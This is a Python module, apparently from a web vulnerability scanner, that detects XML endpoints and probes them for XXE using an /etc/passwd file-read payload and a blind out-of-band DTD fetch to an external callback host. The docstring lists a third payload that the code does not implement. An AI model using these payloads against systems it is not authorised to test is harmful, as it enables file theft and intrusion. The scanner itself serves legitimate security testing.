"""XML External Entity (XXE) scanner.

Targets endpoints that accept XML — discovered when:
  * the original request used `application/xml` / `text/xml` / `application/soap+xml`
  * a form input is named `xml` / contains `<?xml` in its sample value
  * the URL ends in `.xml` / `.svg` / paths containing `soap` / `wsdl`

Three payloads:
  1. In-band file read of /etc/passwd via local DTD
  2. **OOB DNS exfiltration** — uses the interactsh host so blind XXE
     on parsers that have entity-fetching enabled but don't echo content
     still surfaces.
  3. CDATA + parameter entity for parsers that block `SYSTEM` but not
     external parameter entities.
"""
from __future__ import annotations

from typing import TYPE_CHECKING

from core.utils import random_token

if TYPE_CHECKING:
    from core.orchestrator import Context


def _looks_like_xml_endpoint(url: str, method: str, form, params) -> bool:
    if any(s in url.lower() for s in (".xml", ".svg", "/soap", "/wsdl", "/feed/")):
        return True
    if form is not None:
        for inp in form.get("inputs", []):
            sample = (inp.get("value") or "").lower()
            if "<?xml" in sample or "<soap" in sample:
                return True
            if (inp.get("name") or "").lower() in ("xml", "soap", "feed", "data"):
                return True
    return False


def _payload_inband(token: str) -> str:
    return f"""<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY sx SYSTEM "file:///etc/passwd">]>
<r><msg>SX_{token}_&sx;</msg></r>"""


def _payload_oob(token: str, oob_host: str) -> str:
    return f"""<?xml version="1.0"?>
<!DOCTYPE r [
  <!ENTITY % sx SYSTEM "http://{token}.{oob_host}/dtd">
  %sx;
]>
<r/>"""


async def scan(ctx: "Context", url: str, params: list[str], method: str = "GET", form=None):
    findings: list[dict] = []
    if not _looks_like_xml_endpoint(url, method, form, params):
        return findings

    # 1) in-band /etc/passwd read
    token = random_token(6)
    body = _payload_inband(token)
    ev = await ctx.http.post(url, data=body,
                             headers={"Content-Type": "application/xml"})
    if "root:x:0:0:" in (ev.response_body or ""):
        findings.append({
            "category": "xxe",
            "title": "XXE — in-band file read",
            "severity": "critical", "cvss": 9.1,
            "url": url, "payload": body,
            "evidence": "Response body contains `/etc/passwd` content (root:x:0:0:) — "
                        "external entity expansion fully enabled.",
            "request": f"POST {url}\nContent-Type: application/xml\n\n{body}",
            "response": (ev.response_body or "")[:1500],
        })
        return findings

    # 2) OOB DNS / HTTP exfiltration
    if ctx.oob and ctx.oob.registered:
        token = ctx.oob.token()
        oob_body = _payload_oob(token, ctx.oob.backend.domain.split(".", 1)[1]
                                if "." in ctx.oob.backend.domain else ctx.oob.backend.domain)
        # actually use the full domain
        oob_body = f"""<?xml version="1.0"?>
<!DOCTYPE r [
  <!ENTITY % sx SYSTEM "http://{token}.{ctx.oob.backend.domain}/dtd">
  %sx;
]>
<r/>"""
        await ctx.http.post(url, data=oob_body,
                            headers={"Content-Type": "application/xml"})
        # poll OOB
        import asyncio
        await asyncio.sleep(2.0)
        events = await ctx.oob.poll(token)
        if events:
            findings.append({
                "category": "xxe",
                "title": "XXE — blind, confirmed via OOB",
                "severity": "critical", "cvss": 9.0,
                "url": url, "payload": oob_body,
                "evidence": f"Parser fetched the external DTD ({len(events)} OOB hits) — "
                            "blind XXE confirmed even though no body is reflected.",
                "request": f"POST {url}\nContent-Type: application/xml\n\n{oob_body}",
                "metadata": {"detection": "oob"},
            })
    return findings
